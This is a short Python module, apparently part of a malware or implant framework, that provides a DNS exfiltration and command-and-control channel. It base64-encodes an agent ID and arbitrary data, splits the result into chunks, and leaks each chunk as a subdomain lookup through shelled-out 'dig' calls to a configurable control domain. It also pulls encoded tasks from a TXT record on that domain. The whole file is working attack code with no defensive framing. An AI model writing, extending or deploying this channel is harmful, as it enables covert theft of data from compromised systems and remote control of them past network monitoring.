"""
DNS exfil channel.
Implements the send/get interface expected by adaptive_channel_manager.
Configure ZDS_CONTROL_DOMAIN for live use.
"""
from __future__ import annotations

import base64
import os
import time

_CONTROL_DOMAIN = os.environ.get("ZDS_CONTROL_DOMAIN", "")


def send_via_dns(agent_id: str, data: dict) -> bool:
    if not _CONTROL_DOMAIN:
        return False
    try:
        import json
        raw = json.dumps({"agent_id": agent_id, "data": data})
        b64 = base64.b64encode(raw.encode()).decode()
        chunks = [b64[i: i + 40] for i in range(0, len(b64), 40)]
        for chunk in chunks:
            domain = f"{chunk}.{_CONTROL_DOMAIN}"
            os.system(f"dig +short {domain} > /dev/null 2>&1")
            time.sleep(0.3)
        return True
    except Exception:
        return False


def get_task_dns(agent_id: str) -> dict | None:
    if not _CONTROL_DOMAIN:
        return None
    try:
        result = os.popen(
            f"dig +short TXT tasks.{_CONTROL_DOMAIN}"
        ).read().strip().strip('"')
        if not result:
            return None
        data = base64.b64decode(result).decode()
        import json
        parsed = json.loads(data)
        return parsed if parsed.get("task") else None
    except Exception:
        return None
